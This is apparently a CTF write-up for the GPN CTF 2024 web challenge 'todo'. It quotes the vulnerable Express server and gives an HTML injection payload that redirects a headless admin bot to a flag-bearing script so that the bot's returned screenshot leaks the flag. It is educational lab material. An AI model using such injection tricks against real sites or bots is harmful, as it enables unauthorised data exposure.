# todo

## Description
```
I made a JS API! Sadly I had no time to finish it :(
```

## Provided Files
```
- server.js
- package.json
- package-lock.json
- Dockerfile
```

## Writeup

Starting off, we should realize that it's a `XSS` vulnerability we are working with, the reason being the `admin-bot` which we can send our custom `html` webpage to and also the faulty `server.js` service. <br/>
The flag is located at `/script.js` which should be kept in mind for later. <br/>
```js
class FlagAPI {
    constructor() {
        throw new Error("Not implemented yet!")
    }

    static valueOf() {
        return new FlagAPI()
    }

    static toString() {
        return "<FlagAPI>"
    }

    // TODO: Make sure that this is secure before deploying
    // getFlag() {
    //     return "GPNCTF{FAKE_FLAG_ADMINBOT_WILL_REPLACE_ME}"
    // }
}
```

Although we may inject our malicious html content, some security meassures are still in use. <br/>
The `CSP` which can be seen below prevents us to load external ressources. <br/>
```js
app.post('/chal', (req, res) => {
    const { html } = req.body;
    res.setHeader("Content-Security-Policy", "default-src 'none'; script-src 'self' 'unsafe-inline';");
    res.send(`
        <script src="/script.js"></script>
        ${html}
    `);
});
```

The flag is being injected into `/script.js` but only if a certain cookie is present in the request. <br/>
Sadly we can't simply forge/steal/bruteforce the cookie as it is securely being generated by `require('crypto').randomBytes(32).toString('hex')`. <br/>
```js
app.get('/script.js', (req, res) => {
    res.type('.js');
    let response = script;
    console.log(res.get("cookie"))
    if ((req.get("cookie") || "").includes(randomBytes)) response = response.replace(/GPNCTF\{.*\}/, flag)
    res.send(response);
});
```

Stealing the cookie is also not possible because `httpOnly` prevents us from accessing certain ressources including the cookie. <br/>
The only way of obtaing the `flag` therefore is to access the actual contents of `/script.js` because the function `getFlag()` is commented out. <br/>
If the `getFlag()` function wasn't commented out we could use `FlagAPI.prototype.valueOf().getFlag()` to retrieve the flag. <br/>
```js
app.post('/admin', async (req, res) => {
    try {
        const { html } = req.body;
        const browser = await puppeteer.launch({ executablePath: process.env.BROWSER, args: ['--no-sandbox'] });
        const page = await browser.newPage();
        page.setCookie({ name: 'flag', value: randomBytes, domain: 'localhost', path: '/', httpOnly: true });
        await page.goto('http://localhost:1337/');
        await page.type('input[name="html"]', html);
        await page.click('button[type="submit"]');
        await new Promise(resolve => setTimeout(resolve, 2000));
        const screenshot = await page.screenshot({ encoding: 'base64' });
        await browser.close();
        res.send(`<img src="data:image/png;base64,${screenshot}" />`);
    } catch(e) {console.error(e); res.send("internal error :( pls report to admins")}
});
```

Since the only possibility to obtain the flag is the direct access to `/script.js` we need to look at the `admin-bot` functionality which in our case returns a `screenshot` of the current web-page after 2 seconds (2000ms). <br/>
Knowing this we should search for a possibiltiy to change the `admin-bots` location to `/script.js` of which afterwards a `screenshot` will be made and returned to us. <br/>
To change the location of the current web-page of the `admin-bot` we can use javascript to change the current `document.location`. <br/>
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>Hey</h1>
    <p id="flagParagraph"></p>

    <script>
        document.location.replace('/script.js')
    </script>
    <h1>yes</h1>
</body>
</html>
```

Sending the simple `html` webpage above to the `admin-bot` we obtain the screenshot below which concludes this writeup. <br/>
<div style="text-align:center;">
    <img src="https://github.com/Aryt3/writeups/blob/main/jeopardy_ctfs/2024/GPN_CTF_2024/todo/flag.png" alt="Image" />
</div>